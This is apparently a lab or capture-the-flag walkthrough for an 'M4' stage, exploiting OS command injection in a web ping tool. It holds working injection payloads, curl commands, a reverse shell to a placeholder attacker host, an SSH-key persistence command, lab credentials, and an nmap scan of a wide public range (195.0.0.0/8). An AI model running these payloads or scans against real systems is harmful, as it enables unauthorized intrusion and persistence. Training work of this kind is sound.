# M4 — Red Team Solution: OS Command Injection → RCE

**Machine:** aglg-monitor | **Port:** 5000/tcp | **MITRE:** T1059.004

---

## Step 1 — Access

From M3's hint_m4.txt: `netops : N3t0ps@Mon1t0r`

Navigate to `http://<M4-IP>:5000/login`

Login: `netops` / `N3t0ps@Mon1t0r`

---

## Step 2 — Identify Injection Point

Navigate to **Ping Tool** at `/tools/ping`

The host parameter feeds directly into: `ping -c 2 -W 2 {host}` via `subprocess.run(cmd, shell=True)`

---

## Step 3 — OS Command Injection

The semicolon (`;`) chains commands in bash. POST to `/tools/ping`:

```
host=127.0.0.1; id
host=127.0.0.1; cat /opt/aglg/flag4.txt
host=127.0.0.1; cat /opt/aglg/hint_m5.txt
```

**Using curl:**
```bash
# Get session cookie first
curl -s -c cookies.txt -X POST http://<M4-IP>:5000/login \
  -d 'username=netops&password=N3t0ps@Mon1t0r'

# Inject
curl -s -b cookies.txt -X POST http://<M4-IP>:5000/tools/ping \
  -d 'host=127.0.0.1; cat /opt/aglg/flag4.txt'
```

Other payloads:
```bash
# Reverse shell
host=127.0.0.1; bash -i >& /dev/tcp/<attacker>/4444 0>&1

# Write SSH key
host=127.0.0.1; mkdir -p ~/.ssh && echo '<pub_key>' >> ~/.ssh/authorized_keys
```

---

## Step 4 — Pivot to M5

Hint: `archivist : Arch1v1st@AGLG` → scan `nmap -p 8443,22 195.0.0.0/8`

---

## Flag
- `FLAG{<hex>_cmdi_netops}` — at `/opt/aglg/flag4.txt`
